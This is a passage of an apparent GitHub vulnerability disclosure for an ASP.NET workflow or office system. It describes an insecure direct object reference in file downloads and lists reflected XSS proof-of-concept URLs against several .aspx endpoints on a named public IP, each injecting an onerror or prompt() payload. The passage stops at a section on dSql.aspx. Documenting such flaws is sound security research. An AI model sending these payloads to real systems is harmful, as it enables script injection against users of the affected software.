<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302590556-c0dd5ad2-3b5e-494c-b201-9d4abbb833dc.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTA1NTYtYzBkZDVhZDItM2I1ZS00OTRjLWIyMDEtOWQ0YWJiYjgzM2RjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkxZGI0ZDJkNjc1M2UyNzcxODA1MjY2NjgzZmJiZmRmMTdhN2JhNGM3ZWJkNWQxOWZkZWQyMDJjY2I0ZmNhZGYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pFhjSsbbrxxNT2JZEnToNS09KgOfcvJ1Z0hsr-ZgkYw"><img width="1594" alt="image-20240127181528231" src="https://private-user-images.githubusercontent.com/18260135/302590556-c0dd5ad2-3b5e-494c-b201-9d4abbb833dc.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTA1NTYtYzBkZDVhZDItM2I1ZS00OTRjLWIyMDEtOWQ0YWJiYjgzM2RjLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTkxZGI0ZDJkNjc1M2UyNzcxODA1MjY2NjgzZmJiZmRmMTdhN2JhNGM3ZWJkNWQxOWZkZWQyMDJjY2I0ZmNhZGYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pFhjSsbbrxxNT2JZEnToNS09KgOfcvJ1Z0hsr-ZgkYw" style="max-width: 100%;"></a>
<p dir="auto">Iterating over contentid allows for the downloading of corresponding file types. The same issue exists with email_attach_id.</p>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302590752-e8fbd04b-5bdf-43d9-ade0-aba70220abae.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTA3NTItZThmYmQwNGItNWJkZi00M2Q5LWFkZTAtYWJhNzAyMjBhYmFlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTExODNhMGVmYjg4ZTQxYjRiNWJjNDRiYmZjYTk2NzJjYTkxOTI4ZThjNTBjZGIwN2M0YTJlZDJjMGVkZTIwOWUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.5lSkI5VFG9FH9Utw4nzYm7bpYg1y4i9dwrERkVuonn4"><img width="1594" alt="image-20240127181613032" src="https://private-user-images.githubusercontent.com/18260135/302590752-e8fbd04b-5bdf-43d9-ade0-aba70220abae.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTA3NTItZThmYmQwNGItNWJkZi00M2Q5LWFkZTAtYWJhNzAyMjBhYmFlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTExODNhMGVmYjg4ZTQxYjRiNWJjNDRiYmZjYTk2NzJjYTkxOTI4ZThjNTBjZGIwN2M0YTJlZDJjMGVkZTIwOWUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.5lSkI5VFG9FH9Utw4nzYm7bpYg1y4i9dwrERkVuonn4" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">XSS</h2><a id="user-content-xss" class="anchor" aria-label="Permalink: XSS" href="#xss"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">emailset_outside.aspx</h3><a id="user-content-emailset_outsideaspx" class="anchor" aria-label="Permalink: emailset_outside.aspx" href="#emailset_outsideaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/SysManage/emailset_outside.aspx?PageTitle=%E7%B3%BB%E7%BB%9F%E5%A4%96%E5%8F%91%E9%82%AE%E7%AE%B1%3Cimg/src/onerror=prompt(8)%3E
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302591426-7197bd46-29dc-4171-a07e-0a1c69366ca3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE0MjYtNzE5N2JkNDYtMjlkYy00MTcxLWEwN2UtMGExYzY5MzY2Y2EzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTljYTk4ZjdmMDBjZTUxM2U0NTY0NDU0NDdjZTQzMjRlZGQ2YjMxMDM5YTdiYTRlNTlhYmJhNWFiOTFiZjcwYTEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vwRZWTy5hCqLrFJHYidEqFK4UOSbMXqerdZgRBlLPPM"><img width="935" alt="image-20240127200030168" src="https://private-user-images.githubusercontent.com/18260135/302591426-7197bd46-29dc-4171-a07e-0a1c69366ca3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE0MjYtNzE5N2JkNDYtMjlkYy00MTcxLWEwN2UtMGExYzY5MzY2Y2EzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTljYTk4ZjdmMDBjZTUxM2U0NTY0NDU0NDdjZTQzMjRlZGQ2YjMxMDM5YTdiYTRlNTlhYmJhNWFiOTFiZjcwYTEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vwRZWTy5hCqLrFJHYidEqFK4UOSbMXqerdZgRBlLPPM" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">common_new_top.aspx</h3><a id="user-content-common_new_topaspx" class="anchor" aria-label="Permalink: common_new_top.aspx" href="#common_new_topaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/WebUtility/common_new_top.aspx?template_id=1&amp;template_name=testssss%3Cimg/src/onerror=prompt(8)%3E
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302591577-875e6d98-0ca7-4706-8ec4-22ac6a43dd6b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE1NzctODc1ZTZkOTgtMGNhNy00NzA2LThlYzQtMjJhYzZhNDNkZDZiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE2Mjk1YzQ5YTFhYTc0ZDYzNDViZTFjOGI5M2ZhYThiM2Q2ZTZkZTIzYjFiNjc5OWM0ODViMDE0YWU4MTk0MmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NnPTzmNc2Ns5tpzEEtBJQazLSG4JrcrbadXxuFCwJ8I"><img width="930" alt="image-20240127203757656" src="https://private-user-images.githubusercontent.com/18260135/302591577-875e6d98-0ca7-4706-8ec4-22ac6a43dd6b.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE1NzctODc1ZTZkOTgtMGNhNy00NzA2LThlYzQtMjJhYzZhNDNkZDZiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWE2Mjk1YzQ5YTFhYTc0ZDYzNDViZTFjOGI5M2ZhYThiM2Q2ZTZkZTIzYjFiNjc5OWM0ODViMDE0YWU4MTk0MmQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.NnPTzmNc2Ns5tpzEEtBJQazLSG4JrcrbadXxuFCwJ8I" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">common_show.aspx</h3><a id="user-content-common_showaspx" class="anchor" aria-label="Permalink: common_show.aspx" href="#common_showaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/WebUtility/common_show.aspx?template_id=1&amp;template_name=testssss%3Cimg/src/onerror=prompt(8)%3E
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302591660-24b19089-39d6-4d9b-96ef-308e5a06e1bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE2NjAtMjRiMTkwODktMzlkNi00ZDliLTk2ZWYtMzA4ZTVhMDZlMWJkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRkNzM2NzNmMDEzZWQyNmQ0NWRlNmE4YzM1ODQ5ZGZkMDk1MDNmNzQ1ZDMzMzQxNTQ5MjkxZjdkYjQ4ZTdmOGMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vbobIQP9VyVMRgv-mnjpWJffgtoAwuLz11WB1wVkPqs"><img width="931" alt="image-20240127204441516" src="https://private-user-images.githubusercontent.com/18260135/302591660-24b19089-39d6-4d9b-96ef-308e5a06e1bd.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE2NjAtMjRiMTkwODktMzlkNi00ZDliLTk2ZWYtMzA4ZTVhMDZlMWJkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWRkNzM2NzNmMDEzZWQyNmQ0NWRlNmE4YzM1ODQ5ZGZkMDk1MDNmNzQ1ZDMzMzQxNTQ5MjkxZjdkYjQ4ZTdmOGMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vbobIQP9VyVMRgv-mnjpWJffgtoAwuLz11WB1wVkPqs" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">common_show_top.aspx</h3><a id="user-content-common_show_topaspx" class="anchor" aria-label="Permalink: common_show_top.aspx" href="#common_show_topaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/WebUtility/common_show_top.aspx?template_id=1&amp;template_name=testssss%3Cimg/src/onerror=prompt(8)%3E
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302591727-22afb651-7f68-49ed-9d3e-1275300b06a4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE3MjctMjJhZmI2NTEtN2Y2OC00OWVkLTlkM2UtMTI3NTMwMGIwNmE0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQzMWE4NzE1YjhmNDk1ZDZlZGIxNmI3Zjg4OWE2MjdkMWQ5N2FhNDg0YWQ1MzkzOGYwMjRmM2Q4YzVmNDg4ODgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.r7aTbM02PD0uPJwUhgcwGQyDftIJVpUbZq1axw8QJyU"><img width="938" alt="image-20240127204533407" src="https://private-user-images.githubusercontent.com/18260135/302591727-22afb651-7f68-49ed-9d3e-1275300b06a4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1OTE3MjctMjJhZmI2NTEtN2Y2OC00OWVkLTlkM2UtMTI3NTMwMGIwNmE0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTQzMWE4NzE1YjhmNDk1ZDZlZGIxNmI3Zjg4OWE2MjdkMWQ5N2FhNDg0YWQ1MzkzOGYwMjRmM2Q4YzVmNDg4ODgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.r7aTbM02PD0uPJwUhgcwGQyDftIJVpUbZq1axw8QJyU" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">common_deal.aspx</h3><a id="user-content-common_dealaspx" class="anchor" aria-label="Permalink: common_deal.aspx" href="#common_dealaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/WebUtility/common_deal.aspx?template_id=1&amp;template_name=testssss%3Cimg/src/onerror=prompt(8)%3E
</code></pre>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">common_deal_top.aspx</h3><a id="user-content-common_deal_topaspx" class="anchor" aria-label="Permalink: common_deal_top.aspx" href="#common_deal_topaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/WebUtility/common_deal_top.aspx?template_id=1&amp;template_name=testssss%3Cimg/src/onerror=prompt(8)%3E
</code></pre>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_work_print.aspx</h3><a id="user-content-wf_work_printaspx-1" class="anchor" aria-label="Permalink: wf_work_print.aspx" href="#wf_work_printaspx-1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>http://112.74.79.113:8000/WorkFlow/wf_work_print.aspx?AutoPrint=xxxx%27;prompt(8);%2
</code></pre>
<p dir="auto">All of the aforementioned XSS vulnerabilities are caused by the direct output of parameters into the page.</p>
<div class="markdown-heading" dir="auto"><h2 class="heading-element" dir="auto">System Design Flaw</h2><a id="user-content-system-design-flaw" class="anchor" aria-label="Permalink: System Design Flaw" href="#system-design-flaw"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">dSql.aspx</h3><a id="user-content-dsqlaspx" class="anchor" aria-label="Permalink: dSql.aspx" href="#dsqlaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 